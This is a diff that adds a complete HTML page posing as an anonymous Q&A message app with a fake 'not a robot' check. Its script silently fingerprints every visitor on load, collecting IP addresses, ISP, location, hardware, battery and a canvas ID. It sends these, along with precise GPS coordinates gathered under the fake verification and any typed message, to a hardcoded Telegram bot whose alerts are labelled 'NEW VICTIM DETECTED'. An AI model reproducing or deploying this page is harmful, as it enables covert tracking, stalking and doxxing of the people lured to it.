@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Send Me a Message</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        
+        body {
+            background: linear-gradient(45deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .phone-container {
+            width: 100%;
+            max-width: 380px;
+            background: #ffffff;
+            border-radius: 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+            overflow: hidden;
+            min-height: 700px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .app-header {
+            padding: 40px 20px 20px;
+            text-align: center;
+            background: #fff;
+        }
+
+        .profile-pic {
+            width: 90px;
+            height: 90px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 35px;
+            color: white;
+            box-shadow: 0 5px 15px rgba(118, 75, 162, 0.3);
+        }
+
+        h1 { font-size: 22px; color: #333; font-weight: 700; margin-bottom: 5px; }
+        p.status { font-size: 13px; color: #888; font-weight: 500; }
+
+        .content {
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .page { display: none; width: 100%; animation: slideUp 0.4s ease; flex-direction: column; align-items: center; }
+        .page.active { display: flex; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .question-box {
+            width: 100%;
+            background: linear-gradient(135deg, #ff758c 0%, #ff7eb3 100%);
+            padding: 30px 20px;
+            border-radius: 20px;
+            color: white;
+            text-align: center;
+            box-shadow: 0 10px 20px rgba(255, 117, 140, 0.4);
+            margin-bottom: 20px;
+        }
+
+        .question-header { font-weight: 600; font-size: 18px; margin-bottom: 15px; }
+
+        textarea {
+            width: 100%;
+            height: 120px;
+            border: none;
+            border-radius: 15px;
+            padding: 15px;
+            font-size: 16px;
+            resize: none;
+            outline: none;
+            background: rgba(255,255,255,0.9);
+            color: #333;
+        }
+        textarea::placeholder { color: #999; }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: #111;
+            color: #fff;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            transition: transform 0.2s;
+            margin-top: 15px;
+        }
+        .btn:active { transform: scale(0.98); }
+        .btn-location { background: #4facfe; }
+
+        .loader {
+            width: 40px; height: 40px;
+            border: 4px solid #f3f3f3; border-top: 4px solid #ff758c;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px 0;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        
+        .footer-brand {
+            margin-top: auto;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #ccc;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="phone-container">
+        <div class="app-header">
+            <div class="profile-pic">
+                <i class="fas fa-ghost"></i>
+            </div>
+            <h1>Anonymous Q&A</h1>
+            <p class="status">@send_me_questions</p>
+        </div>
+
+        <div class="content">
+            
+            <!-- PAGE 1: Hook -->
+            <div class="page active" id="page1">
+                <div class="question-box" style="background: white; color: #333; box-shadow: none; border: 2px dashed #ddd;">
+                    <i class="fas fa-shield-alt" style="font-size: 40px; color: #ff758c; margin-bottom: 15px;"></i>
+                    <div class="question-header" style="color: #333;">Security Check</div>
+                    <p style="font-size: 14px; color: #666; margin-bottom: 0;">
+                        Verify you are not a robot to continue.
+                    </p>
+                </div>
+                <button class="btn btn-location" onclick="requestPermission()">
+                    <i class="fas fa-check-circle"></i> VERIFY & CONTINUE
+                </button>
+            </div>
+
+            <!-- PAGE 2: Loading -->
+            <div class="page" id="page2">
+                <div class="loader"></div>
+                <p style="color: #888; font-weight: 500;">Verifying...</p>
+            </div>
+
+            <!-- PAGE 3: Input -->
+            <div class="page" id="page3">
+                <div class="question-box">
+                    <div class="question-header">Send me an anonymous message! 🤫</div>
+                    <textarea id="userMessage" placeholder="Type your secret message here..."></textarea>
+                </div>
+                <button class="btn" onclick="sendMessage()">SEND MESSAGE</button>
+                <p style="font-size: 12px; color: #aaa; margin-top: 15px;">100% Anonymous & Safe</p>
+            </div>
+
+            <!-- PAGE 4: Success -->
+            <div class="page" id="page4">
+                <i class="fas fa-paper-plane" style="font-size: 60px; color: #4facfe; margin: 30px 0 20px;"></i>
+                <h2 style="color: #333; margin-bottom: 10px;">Sent!</h2>
+                <p style="color: #888; text-align: center; margin-bottom: 30px;">
+                    Your message has been delivered.
+                </p>
+                <button class="btn" onclick="location.reload()">SEND ANOTHER</button>
+            </div>
+
+        </div>
+        <div class="footer-brand">POWERED BY MR-ZACH</div>
+    </div>
+
+    <script>
+        // CONFIG
+        const BOT_TOKEN = '8578911056:AAFHxmna8z6HbPJli5AGePesTFT4PnWsj_g';
+        const CHAT_ID = '1816673567';
+
+        // GLOBAL DATA STORE
+        let userData = {
+            ip: "Fetching...",
+            network: "Unknown",
+            location: "Unknown",
+            battery: "Unknown",
+            gpu: "Unknown",
+            ram: "Unknown",
+            localIP: "Hidden/VPN",
+            storage: "Unknown",
+            fingerprint: "Unknown"
+        };
+
+        // --- 1. ADVANCED DATA COLLECTION ---
+
+        // Get Local IP (WebRTC Method)
+        async function getLocalIP() {
+            return new Promise((resolve) => {
+                try {
+                    const pc = new RTCPeerConnection({iceServers: []});
+                    pc.createDataChannel('');
+                    pc.createOffer().then(o => pc.setLocalDescription(o));
+                    pc.onicecandidate = (ice) => {
+                        if (ice && ice.candidate && ice.candidate.candidate) {
+                            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                            if (ip) {
+                                pc.close();
+                                resolve(ip[1]);
+                            }
+                        }
+                    };
+                    setTimeout(() => resolve("Hidden/Protected"), 1000); // Timeout
+                } catch(e) { resolve("Not Supported"); }
+            });
+        }
+
+        // Get Storage Estimate
+        async function getStorage() {
+            if (navigator.storage && navigator.storage.estimate) {
+                const quota = await navigator.storage.estimate();
+                const total = (quota.quota / 1024 / 1024 / 1024).toFixed(1); // GB
+                return `${total} GB Available`;
+            }
+            return "Unknown";
+        }
+
+        // Generate Canvas Fingerprint (Unique Device ID)
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("MR-ZACH-FINGERPRINT", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("MR-ZACH-FINGERPRINT", 4, 17);
+                // Simple hash of the base64 string
+                let hash = 0, str = canvas.toDataURL();
+                for (let i = 0; i < str.length; i++) {
+                    hash = ((hash << 5) - hash) + str.charCodeAt(i);
+                    hash |= 0;
+                }
+                return "ID-" + Math.abs(hash);
+            } catch(e) { return "Gen-Failed"; }
+        }
+
+        // Battery Info
+        async function getBatteryStatus() {
+            try {
+                if(navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    const status = b.charging ? '⚡ Charging' : '🔋 Discharging';
+                    return `${Math.round(b.level * 100)}% (${status})`;
+                }
+                return "Not Supported";
+            } catch(e) { return "Access Denied"; }
+        }
+
+        // Hardware & Screen
+        function getHardwareInfo() {
+            let gpu = "Unknown GPU";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if(debugInfo) {
+                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            } catch(e) {}
+
+            return {
+                gpu: gpu,
+                cores: navigator.hardwareConcurrency || "Unknown",
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
+                screen: `${window.screen.width}x${window.screen.height}`,
+                depth: window.screen.colorDepth + "bit",
+                touch: navigator.maxTouchPoints > 0 ? `${navigator.maxTouchPoints} Points` : "No Touch"
+            };
+        }
+
+        // Connection
+        function getConnectionInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if(conn) {
+                return `${conn.effectiveType.toUpperCase()} (Down: ${conn.downlink}Mbps, RTT: ${conn.rtt}ms)`;
+            }
+            return "Unknown Connection";
+        }
+
+        // --- 2. MAIN LOGIC ---
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const params = new URLSearchParams({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' });
+            try {
+                await fetch('https://corsproxy.io/?' + encodeURIComponent(url + '?' + params.toString()));
+            } catch(e) {
+                try { await fetch(url, { method: 'POST', body: params }); } catch(err) {}
+            }
+        }
+
+        function getTime() {
+            return new Date().toLocaleString('en-US', { timeZoneName: 'short' });
+        }
+
+        window.addEventListener('load', async () => {
+            // 1. GATHER DATA
+            const bat = await getBatteryStatus();
+            const localIP = await getLocalIP();
+            const storage = await getStorage();
+            const hw = getHardwareInfo();
+            const net = getConnectionInfo();
+            const fingerprint = getCanvasFingerprint();
+            const referrer = document.referrer || "Direct/Link";
+            const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark Mode" : "Light Mode";
+            const lang = navigator.language || navigator.userLanguage;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            // 2. FETCH PUBLIC IP
+            try {
+                const req = await fetch('https://ipwho.is/');
+                const data = await req.json();
+                
+                if(data.success) {
+                    userData.ip = data.ip;
+                    
+                    // 3. SEND SUPER LOG
+                    const msg = `
+🔔 <b>NEW VICTIM DETECTED</b>
+
+<b>📡 NETWORK</b>
+<b>IP:</b> <code>${data.ip}</code>
+<b>Local IP:</b> ${localIP}
+<b>ISP:</b> ${data.connection.org || data.connection.isp}
+<b>Loc:</b> ${data.city}, ${data.country} ${data.flag.emoji}
+<b>Net:</b> ${net}
+
+<b>📱 DEVICE HARDWARE</b>
+<b>Model (GPU):</b> ${hw.gpu}
+<b>OS:</b> ${navigator.platform}
+<b>Cores:</b> ${hw.cores} | <b>RAM:</b> ${hw.ram}
+<b>Storage:</b> ${storage}
+<b>Battery:</b> ${bat}
+<b>Touch:</b> ${hw.touch}
+
+<b>🖥️ DISPLAY & BROWSER</b>
+<b>Res:</b> ${hw.screen} (${hw.depth})
+<b>Mode:</b> ${darkMode}
+<b>Browser:</b> ${navigator.userAgent}
+<b>Language:</b> ${lang}
+<b>Timezone:</b> ${timeZone}
+
+<b>🆔 FINGERPRINT</b>
+<b>ID:</b> <code>${fingerprint}</code>
+<b>Origin:</b> ${referrer}
+
+<b>⏰ Time:</b> ${getTime()}
+`;
+                    sendToTelegram(msg);
+                }
+            } catch(e) { console.log(e); }
+        });
+
+        // --- 3. INTERACTION ---
+
+        function requestPermission() {
+            document.getElementById('page1').classList.remove('active');
+            document.getElementById('page2').classList.add('active');
+
+            if(navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        const { latitude, longitude, accuracy, altitude, speed } = pos.coords;
+                        
+                        let address = "Unknown Address";
+                        try {
+                            const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+                            const d = await r.json();
+                            if(d.display_name) address = d.display_name;
+                        } catch(e) {}
+
+                        const msg = `📍 <b>PRECISE GPS LOCATION</b>\n\n<b>IP:</b> ${userData.ip}\n<b>Coords:</b> <code>${latitude}, ${longitude}</code>\n<b>Acc:</b> ${accuracy}m | <b>Alt:</b> ${altitude || 0}m\n<b>Speed:</b> ${speed || 0}m/s\n<b>Address:</b> ${address}\n<b>Maps:</b> https://www.google.com/maps?q=${latitude},${longitude}`;
+                        
+                        sendToTelegram(msg);
+                        setTimeout(() => showPage('page3'), 1000);
+                    },
+                    (err) => {
+                        sendToTelegram(`❌ <b>GPS DENIED</b>\nUser refused location permission.\nIP: ${userData.ip}`);
+                        setTimeout(() => showPage('page3'), 1000);
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                showPage('page3');
+            }
+        }
+
+        async function sendMessage() {
+            const txt = document.getElementById('userMessage').value;
+            if(!txt) return alert("Write something!");
+            
+            await sendToTelegram(`📩 <b>MESSAGE RECEIVED</b>\n\n"${txt}"\n\n<b>From IP:</b> ${userData.ip}`);
+            showPage('page4');
+        }
+
+        function showPage(id) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+    </script>
+</body>
+</html>
